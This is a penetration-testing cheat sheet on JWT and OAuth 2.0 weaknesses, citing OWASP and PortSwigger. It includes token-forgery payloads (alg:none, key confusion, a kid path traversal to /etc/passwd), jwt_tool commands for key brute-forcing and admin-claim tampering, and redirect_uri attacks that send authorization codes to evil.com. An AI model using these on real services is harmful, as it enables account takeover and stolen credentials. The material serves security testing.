# JWT + OAuth 2.0 Security Testing

## JWT Attack Surface

### 1. Algorithm Confusion

```bash
# alg:none — the classic
# original: {"alg":"RS256","typ":"JWT"}.payload.signature
# attack: {"alg":"none","typ":"JWT"}.payload.  (empty signature)

# RS256 → HS256 key confusion
# if the server verifies HS256 with the RS256 public key
# you can sign with the public key as the HMAC key
python3 jwt_tool.py <JWT> -X k -pk public.pem

# kid injection
# {"alg":"HS256","kid":"../../../../etc/passwd"}
# the server uses the file content pointed to by kid as the HMAC key
```

### 2. jwt_tool Full Usage

```bash
# full scan
python3 jwt_tool.py <JWT> -t <URL> -cv "Authorization: Bearer <JWT>"

# weak key brute force
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# claim tampering
python3 jwt_tool.py <JWT> -I -pc role -pv admin
python3 jwt_tool.py <JWT> -I -pc exp -pv 9999999999

# RSA key confusion
python3 jwt_tool.py <JWT> -X k -pk public.pem

# embed JWK
python3 jwt_tool.py <JWT> -X i
```

### 3. Manual JWT Tampering

```python
import jwt
import base64

# decode (without verification)
header, payload, sig = jwt.split('.')

# tamper with the payload
payload['role'] = 'admin'
payload['exp'] = 9999999999

# alg:none
new_token = base64url_encode(header) + '.' + base64url_encode(payload) + '.'

# HS256 with known key
new_token = jwt.encode(payload, 'secret', algorithm='HS256')
```

## OAuth 2.0 Attack Surface

### Authorization Code Grant

```text
1. redirect_uri manipulation
   normal: https://app.com/callback?code=AUTH_CODE
   attack: https://app.com/callback@evil.com?code=AUTH_CODE
         https://evil.com/?redirect=https://app.com/callback?code=AUTH_CODE
         open redirect + redirect_uri: https://app.com/callback?redirect=https://evil.com

2. CSRF via missing state
   no state parameter → attacker binds victim's session to their own code

3. Missing PKCE
   no code_challenge → authorization code interception attack

4. Token leakage in Referer
   callback page loads external resources → Referer header contains code/token
```

### Implicit Grant (deprecated but still deployed)

```text
1. access_token in URL fragment → Referer leakage
2. token in browser history → physical access risk
3. no client authentication → token substitution attack
```

### Client Credentials Grant

```text
1. client_secret leakage (hardcoded in frontend/mobile)
2. over-broad scope grants
3. no client rate limiting → brute force enumeration
```

### General OAuth Tests

```text
□ Test scope escalation: scope=read → scope=read%20write
□ Token replay: use an old access_token against new resources
□ Refresh token abuse: indefinite refresh_token renewal
□ Cross-tenant access: tenant A token accessing tenant B
□ Token leakage in logs/URL/Referer
```

## Tools

```bash
# JWT testing
pip install jwt-tool pyjwt

# OAuth testing
# Burp Suite + OAuth Scanner extension
# Postman OAuth 2.0 flow testing

# Automation
# Entropy: automated JWT tampering + OAuth redirect_uri testing
```

Source: OWASP API Top 10 (API2: Broken Authentication), jwt_tool, PortSwigger OAuth research
